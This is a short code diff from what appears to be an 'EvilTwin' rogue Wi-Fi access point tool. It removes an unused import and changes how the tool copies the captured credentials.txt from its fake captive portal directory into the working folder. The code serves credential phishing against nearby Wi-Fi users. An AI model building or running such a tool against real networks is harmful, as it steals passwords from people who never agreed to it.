@@ -13,12 +13,8 @@
 from operator import index
 import os
 from evilconfig import *
-from http.server import BaseHTTPRequestHandler, HTTPServer
-
 
 directorycmd = os.popen('pwd > /dev/null 2>&1').read
-
-
 
 hostapdCONF ="\
 interface=" + wInt + "\n\
@@ -90,8 +86,7 @@ class EvilTwin:
         print ("restore system....\n")
 
         # salva i dati direttamente
-        os.system('cp /var/www/html/captive/credentials.txt ' + str(directorycmd))
-        os.system('mv 0 credentials.txt')
+        os.system('cp /var/www/html/captive/credentials.txt credentials.txt')
 
         os.system('systemctl start systemd-resolved > /dev/null 2>&1')
         os.system('service NetworkManager start > /dev/null 2>&1')
